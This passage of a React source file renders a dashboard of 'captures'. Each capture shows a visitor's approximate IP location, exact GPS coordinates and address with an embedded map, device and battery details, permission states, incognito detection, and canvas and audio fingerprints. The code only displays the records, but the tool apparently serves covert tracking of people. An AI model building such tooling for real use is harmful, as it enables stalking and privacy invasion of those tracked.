                        </DetailSection>

                        {/* 📡 IP Location */}
                        <DetailSection title="📡 IP Location (Approximate)">
                            <DataRow label="City" value={capture.city} />
                            <DataRow label="Region" value={capture.region} />
                            <DataRow label="Country" value={capture.country} />
                            <DataRow label="Country Code" value={capture.countryCode} />
                            <DataRow label="ZIP" value={capture.zip} />
                            <DataRow label="Coordinates" value={capture.lat ? `${capture.lat}, ${capture.lon}` : null} />
                        </DetailSection>

                        {/* 🛰️ GPS Location */}
                        {hasGPS && (
                            <DetailSection title="🛰️ GPS Location (Exact)">
                                <DataRow label="GPS Coords" value={`${capture.gpsLat}, ${capture.gpsLon}`} />
                                <DataRow label="Accuracy" value={capture.gpsAccuracy ? `${capture.gpsAccuracy} metres` : null} />
                                <DataRow label="Address" value={capture.gpsAddress} />
                                <DataRow label="City" value={capture.gpsCity} />
                                <DataRow label="State" value={capture.gpsState} />
                                <DataRow label="District" value={capture.gpsDistrict} />
                                <DataRow label="Locality" value={capture.gpsLocality} />
                                <DataRow label="Road" value={capture.gpsRoad} />
                                <DataRow label="Pincode" value={capture.gpsPincode} />
                                <DataRow label="Country" value={capture.gpsCountry} />
                                <div className="col-span-2 mt-2">
                                    <div className="rounded-xl overflow-hidden border border-surface-border mb-2" style={{ height: 160 }}>
                                        <iframe
                                            title={`map-${index}`}
                                            width="100%" height="100%" frameBorder="0"
                                            src={`https://maps.google.com/maps?q=${capture.gpsLat},${capture.gpsLon}&z=16&output=embed`}
                                            allowFullScreen
                                        />
                                    </div>
                                    <a
                                        href={`https://www.google.com/maps?q=${capture.gpsLat},${capture.gpsLon}`}
                                        target="_blank" rel="noreferrer"
                                        className="inline-flex items-center gap-2 px-4 py-2 bg-primary text-surface rounded-lg font-body text-xs font-bold hover:bg-primary-dark transition-colors"
                                    >
                                        <MapPin className="w-3 h-3" /> View on Google Maps
                                    </a>
                                </div>
                            </DetailSection>
                        )}

                        {/* 📱 Device & Hardware */}
                        <DetailSection title="📱 Device & Hardware">
                            <DataRow label="Device Type" value={capture.device} />
                            <DataRow label="OS" value={capture.os} />
                            <DataRow label="Browser" value={capture.browser} />
                            <DataRow label="Browser Version" value={capture.browserVersion} />
                            <DataRow label="Platform" value={capture.platform} />
                            <DataRow label="CPU Cores" value={capture.cpuCores} />
                            <DataRow label="CPU" value={capture.cpu} />
                            <DataRow label="RAM" value={capture.ram ? `${capture.ram} GB` : null} />
                            <DataRow label="GPU" value={capture.gpu} />
                            <DataRow label="GPU Vendor" value={capture.gpuVendor} />
                            <DataRow label="Touch Points" value={capture.maxTouchPoints} />
                            <DataRow label="Has Touch" value={capture.hasTouch != null ? String(capture.hasTouch) : null} />
                        </DetailSection>

                        {/* 🎮 WebGL */}
                        <DetailSection title="🎮 WebGL & GPU">
                            <DataRow label="WebGL Renderer" value={capture.webglRenderer} />
                            <DataRow label="WebGL Vendor" value={capture.webglVendor} />
                            <DataRow label="WebGL Version" value={capture.webglVersion} />
                            <DataRow label="Shading Language" value={capture.webglShadingLanguageVersion} />
                            <DataRow label="Extensions Count" value={capture.webglExtensions} />
                            <DataRow label="Max Texture Size" value={capture.webglMaxTextureSize} />
                            <DataRow label="Max Viewport W" value={capture.webglMaxViewportWidth} />
                            <DataRow label="Max Viewport H" value={capture.webglMaxViewportHeight} />
                            <DataRow label="Antialiasing" value={capture.webglAntialiasing != null ? String(capture.webglAntialiasing) : null} />
                        </DetailSection>

                        {/* 🔋 Battery */}
                        <DetailSection title="🔋 Battery">
                            <DataRow label="Battery Level" value={capture.batteryLevel != null ? `${capture.batteryLevel}%` : null} />
                            <DataRow label="Charging" value={capture.batteryCharging != null ? (capture.batteryCharging ? "Yes ⚡" : "No") : null} />
                            <DataRow label="Charging Time" value={capture.batteryChargingTime != null ? `${capture.batteryChargingTime}s` : null} />
                            <DataRow label="Discharging Time" value={capture.batteryDischargingTime != null ? `${capture.batteryDischargingTime}s` : null} />
                        </DetailSection>

                        {/* 🖥️ Screen & Display */}
                        <DetailSection title="🖥️ Screen & Display">
                            <DataRow label="Resolution" value={capture.screenWidth ? `${capture.screenWidth}x${capture.screenHeight}` : null} />
                            <DataRow label="Available" value={capture.screenAvailWidth ? `${capture.screenAvailWidth}x${capture.screenAvailHeight}` : null} />
                            <DataRow label="Window" value={capture.windowWidth ? `${capture.windowWidth}x${capture.windowHeight}` : null} />
                            <DataRow label="Outer" value={capture.outerWidth ? `${capture.outerWidth}x${capture.outerHeight}` : null} />
                            <DataRow label="Screen X" value={capture.screenX} />
                            <DataRow label="Screen Y" value={capture.screenY} />
                            <DataRow label="Scroll X" value={capture.scrollX} />
                            <DataRow label="Scroll Y" value={capture.scrollY} />
                            <DataRow label="Color Depth" value={capture.colorDepth ? `${capture.colorDepth} bit` : null} />
                            <DataRow label="Pixel Depth" value={capture.pixelDepth ? `${capture.pixelDepth} bit` : null} />
                            <DataRow label="Pixel Ratio" value={capture.pixelRatio} />
                            <DataRow label="Device Scale" value={capture.deviceScaleFactor} />
                            <DataRow label="Color Gamut" value={capture.colorGamut} />
                            <DataRow label="Orientation" value={capture.screenOrientation} />
                            <DataRow label="Orientation Angle" value={capture.screenOrientationAngle != null ? `${capture.screenOrientationAngle}°` : null} />
                            <DataRow label="Orientation Type" value={capture.screenOrientationType} />
                            <DataRow label="Extended Display" value={capture.screenIsExtended != null ? String(capture.screenIsExtended) : null} />
                            <DataRow label="Fullscreen" value={capture.isFullscreen != null ? String(capture.isFullscreen) : null} />
                            <DataRow label="Visibility" value={capture.documentVisibility} />
                        </DetailSection>

                        {/* 🔍 Browser Details */}
                        <DetailSection title="🔍 Browser Details">
                            <DataRow label="Language" value={capture.language} />
                            <DataRow label="Languages" value={capture.languages} />
                            <DataRow label="Platform" value={capture.platform} />
                            <DataRow label="App Name" value={capture.appName} />
                            <DataRow label="App Version" value={capture.appVersion} />
                            <DataRow label="App Code Name" value={capture.appCodeName} />
                            <DataRow label="Product" value={capture.product} />
                            <DataRow label="Product Sub" value={capture.productSub} />
                            <DataRow label="Vendor" value={capture.vendor} />
                            <DataRow label="Vendor Sub" value={capture.vendorSub} />
                            <DataRow label="Cookies" value={capture.cookiesEnabled != null ? (capture.cookiesEnabled ? "Enabled" : "Disabled") : null} />
                            <DataRow label="Do Not Track" value={capture.doNotTrack} />
                            <DataRow label="History Length" value={capture.historyLength} />
                            <DataRow label="Referrer" value={capture.referrer} />
                            <DataRow label="Online" value={capture.onLine != null ? String(capture.onLine) : null} />
                            <DataRow label="PDF Viewer" value={capture.pdfViewerEnabled != null ? String(capture.pdfViewerEnabled) : null} />
                            <DataRow label="Java Enabled" value={capture.javaEnabled != null ? String(capture.javaEnabled) : null} />
                            <DataRow label="Doc Title" value={capture.documentTitle} />
                            <DataRow label="Doc Charset" value={capture.documentCharset} />
                            <DataRow label="Compat Mode" value={capture.documentCompatMode} />
                            <DataRow label="Ready State" value={capture.documentReadyState} />
                            <DataRow label="Plugins Count" value={capture.pluginsCount} />
                            <DataRow label="MIME Types" value={capture.mimeTypesCount} />
                            <DataRow label="Plugins" value={capture.plugins} />
                            <DataRow label="User Agent" value={capture.userAgent} />
                        </DetailSection>

                        {/* 🌍 Timezone & Locale */}
                        <DetailSection title="🌍 Timezone & Locale">
                            <DataRow label="Timezone" value={capture.timezone} />
                            <DataRow label="Timezone Offset" value={capture.timezoneOffset != null ? `${capture.timezoneOffset} min` : null} />
                            <DataRow label="TZ Offset Min" value={capture.timezoneOffsetMinutes} />
                            <DataRow label="Locale" value={capture.locale} />
                            <DataRow label="Hour Cycle" value={capture.hourCycle} />
                            <DataRow label="Calendar" value={capture.calendar} />
                            <DataRow label="Numbering System" value={capture.numberingSystem} />
                        </DetailSection>

                        {/* 💾 Storage */}
                        <DetailSection title="💾 Storage">
                            <DataRow label="Storage Quota" value={capture.storageQuota != null ? `${capture.storageQuota} MB` : null} />
                            <DataRow label="Storage Usage" value={capture.storageUsage != null ? `${capture.storageUsage} MB` : null} />
                        </DetailSection>

                        {/* 🎤 Media Devices */}
                        <DetailSection title="🎤 Media Devices">
                            <DataRow label="Audio Inputs" value={capture.audioInputCount} />
                            <DataRow label="Audio Outputs" value={capture.audioOutputCount} />
                            <DataRow label="Video Inputs" value={capture.videoInputCount} />
                        </DetailSection>

                        {/* 🔒 Permissions */}
                        <DetailSection title="🔒 Permissions">
                            <DataRow label="Camera" value={capture.permCamera} />
                            <DataRow label="Microphone" value={capture.permMicrophone} />
                            <DataRow label="Notifications" value={capture.permNotifications} />
                            <DataRow label="Geolocation" value={capture.permGeolocation} />
                            <DataRow label="Clipboard" value={capture.permClipboard} />
                        </DetailSection>

                        {/* ⚡ Performance */}
                        <DetailSection title="⚡ Performance">
                            <DataRow label="Page Load Time" value={capture.pageLoadTime != null ? `${capture.pageLoadTime} ms` : null} />
                            <DataRow label="DOM Content Loaded" value={capture.domContentLoaded != null ? `${capture.domContentLoaded} ms` : null} />
                            <DataRow label="Time to First Byte" value={capture.timeToFirstByte != null ? `${capture.timeToFirstByte} ms` : null} />
                            <DataRow label="JS Heap Limit" value={capture.deviceMemoryHeap != null ? `${capture.deviceMemoryHeap} MB` : null} />
                            <DataRow label="Used JS Heap" value={capture.usedJSHeap != null ? `${capture.usedJSHeap} MB` : null} />
                        </DetailSection>

                        {/* 🕵️ Privacy */}
                        <DetailSection title="🕵️ Privacy">
                            <DataRow label="Incognito" value={capture.incognito != null ? (capture.incognito ? "Yes 🕵️" : "No") : null} />
                            <DataRow label="Ad Blocker" value={capture.adBlockEnabled != null ? (capture.adBlockEnabled ? "Yes" : "No") : null} />
                        </DetailSection>

                        {/* 🖱️ Input & Display Capabilities */}
                        <DetailSection title="🖱️ Input & Display">
                            <DataRow label="Hover" value={capture.hoverCapability} />
                            <DataRow label="Pointer Type" value={capture.pointerType} />
                            <DataRow label="Pointer Coarse" value={capture.pointerCoarse != null ? String(capture.pointerCoarse) : null} />
                            <DataRow label="Pointer Fine" value={capture.pointerFine != null ? String(capture.pointerFine) : null} />
                            <DataRow label="Any Hover" value={capture.anyHover != null ? String(capture.anyHover) : null} />
                            <DataRow label="Any Pointer" value={capture.anyPointer} />
                            <DataRow label="Display Mode" value={capture.displayMode} />
                            <DataRow label="Prefers Dark" value={capture.prefersColorScheme} />
                            <DataRow label="Reduced Motion" value={capture.prefersReducedMotion != null ? String(capture.prefersReducedMotion) : null} />
                            <DataRow label="High Contrast" value={capture.prefersContrast} />
                            <DataRow label="Forced Colors" value={capture.forcedColors != null ? String(capture.forcedColors) : null} />
                        </DetailSection>

                        {/* 🔬 Fingerprints */}
                        <DetailSection title="🔬 Fingerprints">
                            <DataRow label="Canvas Hash" value={capture.canvasHash} />
                            <DataRow label="Audio Fingerprint" value={capture.audioFingerprint} />
                            <DataRow label="Font Count" value={capture.fontCount} />
                            <DataRow label="Math Sin" value={capture.mathSin} />
                            <DataRow label="Math Cos" value={capture.mathCos} />
                            <DataRow label="Math Tan" value={capture.mathTan} />
                            <DataRow label="Math Log" value={capture.mathLog} />
                            <DataRow label="Math Sqrt" value={capture.mathSqrt} />
                            <DataRow label="Math Asin" value={capture.mathAsin} />
                            <DataRow label="Math Sinh" value={capture.mathSinh} />
                            <DataRow label="Math Cosh" value={capture.mathCosh} />
                            <DataRow label="Math Expm1" value={capture.mathExpm1} />
                        </DetailSection>

                        {/* 🌐 Browser Features */}
                        <DetailSection title="🌐 Browser Features">
                            <DataRow label="Service Worker" value={capture.hasServiceWorker != null ? String(capture.hasServiceWorker) : null} />
                            <DataRow label="Web Worker" value={capture.hasWebWorker != null ? String(capture.hasWebWorker) : null} />
                            <DataRow label="WebSocket" value={capture.hasWebSocket != null ? String(capture.hasWebSocket) : null} />
                            <DataRow label="IndexedDB" value={capture.hasIndexedDB != null ? String(capture.hasIndexedDB) : null} />
                            <DataRow label="WebRTC" value={capture.hasWebRTC != null ? String(capture.hasWebRTC) : null} />
                            <DataRow label="Canvas" value={capture.hasCanvas != null ? String(capture.hasCanvas) : null} />
                            <DataRow label="WebGL" value={capture.hasWebGL != null ? String(capture.hasWebGL) : null} />
                            <DataRow label="WebGL2" value={capture.hasWebGL2 != null ? String(capture.hasWebGL2) : null} />
                            <DataRow label="Bluetooth" value={capture.hasBluetooth != null ? String(capture.hasBluetooth) : null} />
                            <DataRow label="USB" value={capture.hasUSB != null ? String(capture.hasUSB) : null} />
                            <DataRow label="NFC" value={capture.hasNFC != null ? String(capture.hasNFC) : null} />
                            <DataRow label="Gamepad" value={capture.hasGamepad != null ? String(capture.hasGamepad) : null} />
                            <DataRow label="Vibration" value={capture.hasVibration != null ? String(capture.hasVibration) : null} />
                            <DataRow label="Geolocation" value={capture.hasGeolocation != null ? String(capture.hasGeolocation) : null} />
                            <DataRow label="Battery API" value={capture.hasBattery != null ? String(capture.hasBattery) : null} />
                            <DataRow label="Device Memory" value={capture.hasDeviceMemory != null ? String(capture.hasDeviceMemory) : null} />
                            <DataRow label="Hardware Concurrency" value={capture.hasHardwareConcurrency != null ? String(capture.hasHardwareConcurrency) : null} />
                            <DataRow label="Credentials" value={capture.hasCredentials != null ? String(capture.hasCredentials) : null} />
                            <DataRow label="Share" value={capture.hasShare != null ? String(capture.hasShare) : null} />
                            <DataRow label="Clipboard" value={capture.hasClipboard != null ? String(capture.hasClipboard) : null} />
                            <DataRow label="Wake Lock" value={capture.hasWakeLock != null ? String(capture.hasWakeLock) : null} />
                            <DataRow label="Speech Recog." value={capture.hasSpeechRecognition != null ? String(capture.hasSpeechRecognition) : null} />
                            <DataRow label="Speech Synth." value={capture.hasSpeechSynthesis != null ? String(capture.hasSpeechSynthesis) : null} />
                            <DataRow label="Payment Request" value={capture.hasPaymentRequest != null ? String(capture.hasPaymentRequest) : null} />
                            <DataRow label="Notification" value={capture.hasNotification != null ? String(capture.hasNotification) : null} />
                            <DataRow label="Push Manager" value={capture.hasPushManager != null ? String(capture.hasPushManager) : null} />
                            <DataRow label="Crypto" value={capture.hasCrypto != null ? String(capture.hasCrypto) : null} />
                            <DataRow label="Performance" value={capture.hasPerformance != null ? String(capture.hasPerformance) : null} />
                            <DataRow label="Intersection Obs." value={capture.hasIntersectionObserver != null ? String(capture.hasIntersectionObserver) : null} />
                            <DataRow label="Resize Observer" value={capture.hasResizeObserver != null ? String(capture.hasResizeObserver) : null} />
                            <DataRow label="Mutation Observer" value={capture.hasMutationObserver != null ? String(capture.hasMutationObserver) : null} />
                            <DataRow label="RAF" value={capture.hasRequestAnimationFrame != null ? String(capture.hasRequestAnimationFrame) : null} />
                            <DataRow label="Fetch" value={capture.hasFetch != null ? String(capture.hasFetch) : null} />
                            <DataRow label="LocalStorage" value={capture.hasLocalStorage != null ? String(capture.hasLocalStorage) : null} />
                            <DataRow label="SessionStorage" value={capture.hasSessionStorage != null ? String(capture.hasSessionStorage) : null} />
                        </DetailSection>

                        {/* 📄 Page Context */}
                        <DetailSection title="📄 Page Context">
                            <DataRow label="Page URL" value={capture.pageUrl} />
                            <DataRow label="Hostname" value={capture.pageHostname} />
                            <DataRow label="Protocol" value={capture.pageProtocol} />
                            <DataRow label="Path" value={capture.pagePathname} />
                            <DataRow label="Query" value={capture.pageSearch} />
                            <DataRow label="Hash" value={capture.pageHash} />
                        </DetailSection>

                    </div>
                </div>
            )}
        </div>
    );
}

function DetailSection({ title, children }) {
    return (
        <div className="mb-4">
            <div className="font-body text-xs text-primary uppercase tracking-wider mb-2 pb-1 border-b border-surface-border">{title}</div>
            <div className="grid grid-cols-2 gap-x-4 gap-y-2">{children}</div>
        </div>
    );
}

function DataRow({ label, value }) {
    if (value == null || value === "" || value === "null") return null;
    return (
        <div>
            <div className="font-body text-xs text-text-muted uppercase tracking-wider mb-0.5">{label}</div>
            <div className="font-mono text-xs text-text-primary break-all">{String(value)}</div>
        </div>
    );
}

function InfoRow({ label, children }) {
    return (
        <div className="flex flex-col sm:flex-row sm:items-center gap-2 px-6 py-4">
            <div className="font-body text-xs text-text-muted uppercase tracking-wider w-36 flex-shrink-0">{label}</div>
            <div className="flex items-center gap-2 flex-1 min-w-0">{children}</div>
        </div>
    );
}
